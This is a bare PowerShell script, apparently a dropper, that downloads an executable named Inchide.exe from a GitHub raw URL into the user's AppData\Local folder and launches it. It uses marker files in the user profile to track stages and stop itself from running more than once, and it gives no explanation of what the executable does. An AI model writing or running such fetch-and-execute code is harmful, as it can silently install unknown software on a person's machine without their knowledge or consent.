$x = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
$y = "$env:USERPROFILE\AppData\Local\inchide.exe"

if (Test-Path "$env:USERPROFILE\EXITR2.txt") {
    exit
}

New-Item -Path "$env:USERPROFILE\H123R2.txt" -ItemType "file"

if (Test-Path "$env:USERPROFILE\H360R2.txt") {
    New-Item -Path "$env:USERPROFILE\EXITR2.txt" -ItemType "file"
    Start-Process $y
}

if (Test-Path "$env:USERPROFILE\H123R2.txt") {
    New-Item -Path "$env:USERPROFILE\H360R2.txt" -ItemType "file"
    Start-Process $y
}

Invoke-WebRequest -Uri $x -OutFile $y
